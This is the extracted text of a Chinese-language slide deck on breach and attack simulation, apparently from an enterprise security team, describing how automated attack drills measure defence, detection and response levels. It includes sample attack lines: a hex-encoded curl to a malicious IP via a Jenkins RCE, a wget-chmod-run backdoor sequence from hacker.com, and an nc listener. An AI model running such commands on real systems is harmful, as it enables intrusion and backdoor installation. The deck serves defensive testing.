•
什么是入侵攻击模拟
•
要解决的问题
•
存在的挑战
•
入侵攻击模拟演练
•
机制简介
•
突破入口模拟
•
防御水位衡量
•
模拟演练机制简介
•
检测/响应水位衡量
•
其他业务场景落地
•
企业采用多种安全措施，每一种都可能因
配置错误/运营问题失效，且难以察觉
•
如仅依靠蓝军或外采渗透测试，案例数量
较少、时间上不连续、可能遗漏、成本高
•
安全水位无法量化，建设效果难以衡量
•
从攻击者视角对企业基础设施进行持续的自动化安全测试
•
针对安全措施失效、蓝军成本高的问题
•
定义模型量化当前安全水位，发现问题，反哺防御检测能力
•
->解决无法量化的问题
•
2017年，Gartner将入侵攻击模拟技术(BAS)列为威胁对抗Hype Cycle
中的新类别
•
如何对入侵攻击场景进行威胁建模并分级
•
如何持续、尽量真实地测试并避免稳定性问题
•
防御、检测水位如何量化评估
•
什么是入侵攻击模拟
•
要解决的问题
•
存在的挑战
•
入侵攻击模拟演练
•
机制简介
•
突破入口模拟
•
防御水位衡量
•
模拟演练机制简介
•
检测/响应水位衡量
•
其他业务场景落地
杀伤链模型
攻击行为模拟
-->衡量检测响应水位
突破入口模拟
-->衡量防御水位
寻找突破入口
实施恶意行为
阻止攻击
检测响应修复
“利用成功”前后
攻防重点不同
攻击方
防守方
模拟演练方
脚本小子
专业蓝军
国家顶尖
技术水平一般，
主要利用现成
工具；资源少
技术水平较高，
自行编写工具；
资源较多
技术水平高，
可能使用0day；
资源丰富
•
什么是入侵攻击模拟
•
要解决的问题
•
存在的挑战
•
入侵攻击模拟演练
•
机制简介
•
突破入口模拟
•
防御水位衡量
•
模拟演练机制简介
•
检测/响应水位衡量
•
其他业务场景落地
录入测试
插件
原子能力
测试
随机拨测
回归测试
枚举入侵
威胁
防御措施
?
拦截
未拦
防御措施
防御措施
变更
攻击1
攻击2
攻击3
…
攻击1
攻击2
攻击3
…
优化防御策略
目标入口
攻击向量
绕过手法
恶意行为
Web通用组件-Jenkins
(脚本语言为Groovy)
远程命令执行漏洞
CVE-2018-1000861
编码-十六进制编码
(Groovy原生支持hex和base64)
连接恶意网站-curl 
120.26.xx.xx:23333
“curl 120.26.xx.xx:23333”的十六进制
编码
目标入口
Target of Attack/
Vulnerable Point
攻击向量
Attack Vector/
Vulnerability
绕过手法
Bypass/Escape/
Encoding
恶意行为
Shellcode/Command/
Malicious Outcome
Web服务及组件
其他服务
自研服务/组件
通用服务/组件
注入
服务端请求伪造(SSRF)
不安全的反序列化
访问控制存在问题
…
X
X
X
编码
语法语义
架构/性能
数据渗出
后门植入/持久化
权限提升
凭证窃取
自研服务/组件
通用服务/组件
…
•
什么是入侵攻击模拟
•
要解决的问题
•
存在的挑战
•
入侵攻击模拟演练
•
机制简介
•
突破入口模拟
•
防御水位衡量
•
模拟演练机制简介
•
检测/响应水位衡量
•
其他业务场景落地
目标入口
攻击向量
攻击类型
绕过手法
恶意行为
POC
测试时间
拦截
情况
目标1
向量1
类型1
绕过1
行为1
…
时间1
✅
目标2
向量2
类型2
绕过2
行为2
…
时间2
❌
目标3
向量3
类型3
绕过3
行为3
…
时间3
✅
…
…
…
…
…
…
…
…
测试结果汇总
攻击类型
拦截数/
攻击数
未拦截
详情
命令执行
…/…
…
SQL注入
…/…
…
…
…
…
总计
…/…
…
原子能力衡量
目标入口
拦截数/攻
击数
分析
目标1
0/100
未接入防御措施
目标2
36/100
防御措施不足
…
…
…
随机拨测
回归测试
测试
样例
测试时间
(变更前)
拦截
测试时间
(变更后)
拦截
分析
攻击1
…
✅
…
✅
正常
攻击2
…
✅
…
❌
变更导致
防御失效
…
…
…
…
…
…
总计
…
100
…
88
需回滚
•
什么是入侵攻击模拟
•
要解决的问题
•
存在的挑战
•
入侵攻击模拟演练
•
机制简介
•
突破入口模拟
•
防御水位衡量
•
模拟演练机制简介
•
检测/响应水位衡量
•
其他业务场景落地
演练剧本
编排
攻击指令
执行
反入侵团
队介入
演练报告
生成
l 随机化剧本生成
Ø 机器数
Ø 应用范围
Ø 攻击阶段
Ø 。。。
攻击路径生成
Ø后门植入
Ø命令与控制
Ø持久化
Ø数据窃取
Ø。。。
攻击手法分配
输入参数
Ø后门植入
Ø命令与控制
Ø持久化
Ø数据窃取
Ø。。。
HOW？
1. wget http://hacker.com/backdoor
2. chmod +x backdoor
3. ./backdoor
4. …
攻击手法序列
攻击命令序列
l 攻击手法组件化（已集成300+手法）
突破入口
后门植入
命令与控制
权限提升
持久化
。。。
Fastjson反序列化
wget下载
Bash反弹shell
dirty cow
crontab
定时任务
CVE-2018-
1000861
curl下载
http后门
sudo
Linux创建用户
。。。
。。。
。。。
。。。
。。。
l 攻击手法组件化
目录发现
shell.run(“ls /”)
http后门
shell=remote(“nc –lvv port”）; path
wget下载执行
wget URL –O path; chmod +x path 
参数传递（path）
参数传递（shell）
后门植入
命令与控制
发现
•
什么是入侵攻击模拟
•
要解决的问题
•
存在的挑战
•
入侵攻击模拟演练
•
机制简介
•
突破入口模拟
•
防御水位衡量
•
模拟演练机制简介
•
检测/响应水位衡量
•
其他业务场景落地
l ATT&CK矩阵维度
突破入口
后门植入
命令与控制
。。。
可检测手法数
30
20
45
总手法数
40
20
50
比例
75%
100%
90%
l 事件等级评定（单次事件纬度）
将各维度得分相加
Ø 0 ～ 5分
脚本小子级别
Ø 5～10分
专业蓝军级别
Ø >=11分
国家顶尖级别
项目\得分
0分
1分
2分
机器数量
10
Attck子矩阵覆
盖数量
=7
…
…
…
…
l 检测水位衡量矩阵（单次事件纬度）
突破入口
后门植入
命令与控制
。。。
进程
❌
✅
✅
网络
✅
✅
❌
文件
/
/
✅
。。。
。。。
。。。
。。。
l 响应水位衡量
突破入口
后门植入
命令与控制
。。。
止血
。。。
溯源
✅
✅
❌
。。。
。。。
。。。
。。。
•
什么是入侵攻击模拟
•
要解决的问题
•
存在的挑战
•
入侵攻击模拟演练
•
机制简介
•
突破入口模拟
•
防御水位衡量
•
模拟演练机制简介
•
检测/响应水位衡量
•
其他业务场景落地
•
能力稳定性日常拨测
     每日随机演练，确保IDS告警产出的稳定性
•
能力回归测试
     IDS有更新时自测有效性后再上线
•
历史入侵事件复现
     通过构造特定剧本，沉淀历史入侵事件用于复测